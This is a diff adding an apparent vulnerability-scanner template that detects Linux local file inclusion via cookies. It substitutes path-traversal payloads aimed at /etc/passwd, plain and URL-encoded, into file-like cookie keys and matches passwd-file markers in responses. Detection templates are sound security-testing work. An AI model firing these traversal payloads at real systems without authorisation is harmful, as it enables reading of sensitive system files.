@@ -1,0 +1,46 @@
+id: ptflow-lfi-passwd-cookie
+
+info:
+  name: Linux Local File Inclusion via Cookie
+  author: ptflow
+  severity: high
+  description: Detects traversal to /etc/passwd from a cookie value using two structural response markers.
+  metadata:
+    max-request: 2
+    verified: true
+  tags: ptflow,dast,lfi,path-traversal,stable,fuzzing-req-cookie
+
+http:
+  -
+    pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    payloads:
+      traversal:
+        low:
+          - '../../../../../../etc/passwd'
+        medium:
+          - '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+
+    fuzzing:
+      - part: cookie
+        mode: single
+        type: replace
+        keys-regex:
+          - '(?i)^(?:file|filename|filepath|path|page|include|template|document|folder|root|dir|download|load|x-file-path|x-path)$'
+        fuzz:
+          - '{{traversal}}'
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?m)^root:[^:\r\n]*:0:0:'
+      - type: word
+        part: body
+        words:
+          - 'daemon:'
